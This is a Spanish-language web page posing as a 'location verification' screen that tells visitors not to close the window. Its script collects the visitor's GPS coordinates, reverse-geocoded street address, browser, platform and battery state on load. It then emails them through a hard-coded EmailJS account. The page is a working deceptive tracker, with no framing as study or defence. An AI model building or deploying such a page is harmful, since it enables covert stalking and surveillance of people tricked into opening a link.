<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verificación</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("L4wkgDOuz9isZto4k"); // Tu Public Key
    })();
  </script>
  <style>
    body {
      font-family: 'Montserrat', sans-serif;
      margin: 0;
      padding: 40px 20px;
      background: linear-gradient(135deg, #6e8efb, #a777e3);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
    }

    .container {
      background: rgba(255, 255, 255, 0.1);
      padding: 30px 20px;
      border-radius: 20px;
      backdrop-filter: blur(10px);
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
      max-width: 400px;
      width: 100%;
    }
  </style>
</head>
<body onload="getLocation()">
  <div class="container">
    <h1>Verificando ubicación...</h1>
    <p>No cierres esta ventana.</p>
  </div>

  <script>
    let datosExtra = {
      fecha: new Date().toLocaleString(),
      navegador: navigator.userAgent,
      sistema: navigator.platform,
      bateria: "Desconocido",
      cargando: "Desconocido"
    };

    navigator.getBattery?.().then(battery => {
      datosExtra.bateria = `${Math.round(battery.level * 100)}%`;
      datosExtra.cargando = battery.charging ? "Sí" : "No";
    });

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
      } else {
        console.warn("Geolocalización no soportada.");
      }
    }

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const mapURL = `https://www.google.com/maps?q=${lat},${lon}`;

      fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`)
        .then(response => response.json())
        .then(data => {
          const direccion = data.display_name || "No disponible";

          emailjs.send("service_u9hn50k", "template_ilvuo2s", {
            latitud: lat,
            longitud: lon,
            direccion: direccion,
            map_url: mapURL,
            fecha: datosExtra.fecha,
            navegador: datosExtra.navegador,
            sistema: datosExtra.sistema,
            bateria: datosExtra.bateria,
            cargando: datosExtra.cargando
          }).then(function(response) {
            console.log("Correo enviado con éxito");
          }, function(error) {
            console.error("Error al enviar correo:", error);
          });
        });
    }

    function showError(error) {
      console.warn("No se pudo obtener la ubicación:", error);
    }
  </script>
</body>
</html>
